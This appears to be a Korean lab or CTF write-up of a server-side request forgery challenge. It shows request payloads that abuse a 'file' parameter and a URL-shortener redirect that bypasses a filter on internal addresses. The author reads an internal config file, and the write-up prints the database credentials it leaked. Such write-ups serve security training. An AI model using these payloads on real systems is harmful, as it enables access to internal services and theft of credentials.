===========================
SSRF 2번
===========================

1. 공격 과정
  1) 공지사항 새로고침 기능에서 file 파라미터를 확인
     정상 요청: file=file:///var/www/html/notice_data.html&read=공지 업데이트

  2) file 파라미터에 외부 URL을 입력해 서버가 직접 요청을 보내는지 확인
     file=https://httpbin.org/get&read=test

     응답에 httpbin의 JSON 결과가 출력되어 SSRF 취약점이 존재함을 확인

  3) 내부 서버 주소를 직접 요청
     file=http://eqst-ssrf-victim.com/include/db_conf.php&read=test

     직접 요청은 정상적으로 출력되지 않음

  4) URL 단축 서비스를 이용해 최종 목적지를 압축
     http://eqst-ssrf-victim.com/include/db_conf.php => https://lrl.kr/e0gnj

  5) 생성된 단축 URL을 file 파라미터에 삽입
     file=https://lrl.kr/e0gnj&read=test

  6) 응답에서 DB 접속 정보가 출력되었고, 비밀번호를 확인했다.

     host: 127.0.0.1
     user: ssrf_user
     password: admin_will_be_fired
     db: skinfosec
